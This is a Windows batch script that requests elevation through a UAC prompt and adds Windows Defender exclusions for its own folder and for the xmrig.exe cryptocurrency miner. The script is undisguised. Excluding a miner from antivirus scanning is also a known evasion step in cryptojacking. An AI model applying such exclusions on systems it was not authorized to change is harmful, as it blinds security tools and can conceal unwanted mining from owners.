@echo off
setlocal enabledelayedexpansion

:: Check for Administrative privileges; request UAC elevation if needed
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting Administrator privileges to update Windows Defender settings...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

cd /d "%~dp0"
set "PROJ_DIR=%~dp0"
if "%PROJ_DIR:~-1%"=="\" set "PROJ_DIR=%PROJ_DIR:~0,-1%"

echo =======================================================
echo   Windows Defender Exclusions Setup
echo =======================================================
echo Target Directory: %PROJ_DIR%
echo.

powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%PROJ_DIR%'"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess '%PROJ_DIR%\xmrig.exe'"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'xmrig.exe'"

echo.
echo =======================================================
echo [SUCCESS] Windows Defender exclusions applied!
echo   - Folder Excluded:  "%PROJ_DIR%"
echo   - Process Excluded: "xmrig.exe"
echo =======================================================
echo.
pause
